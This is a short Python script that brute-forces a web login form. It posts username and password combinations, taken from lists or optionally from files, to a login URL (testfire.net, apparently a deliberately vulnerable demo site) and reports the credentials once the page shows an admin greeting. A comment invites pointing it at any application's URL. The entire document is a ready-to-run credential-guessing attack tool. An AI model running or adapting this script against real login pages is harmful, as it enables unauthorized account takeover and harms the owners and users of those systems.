import requests
import sys

host = "http://testfire.net/doLogin" # Change the URL with the appliucation's URL
users = ['Adin', 'ADIN', 'admin'] # you can use a list or a file
passwordList = ['Adm1n', 'ADMIN', 'admin'] # you can use a list or a file
needle = "Hello Admin User"
attempts = 0

for user in users:
    for password in passwordList:
        password = password.strip('\n').encode()
        #sys.stdout.write(">>Attempting brute force with {}:{}".format(user,password))
        #sys.stdout.flush()
        r = requests.post(host, data={'uid': user, 'passw': password})
        if needle.encode() in r.content:
            sys.stdout.write("uid is {} and Password is {} found it on attempt {}!".format(user,password, attempts))
            sys.stdout.flush()
            exit(1)
        attempts+=1
# use this code by removing quotes if you are planning to use files instead of lists
'''
with open('users.txt','r') as userList:
    for user in userList:
        with open('passwords.txt', 'r') as passwordList:
            for password in passwordList:
                password = password.strip('\n')
                print(">>Attempting brute force with {} : {}\b".format(user, password))
                r = requests.post(host, data={'uid': user, 'passw': password})
                if needle.encode() in r.content:
                    print("uid is {} and Password is {} found it on attempt {}!\n".format(user, password, attempts))
                    exit(1)
                attempts+=1
exit(0)
'''
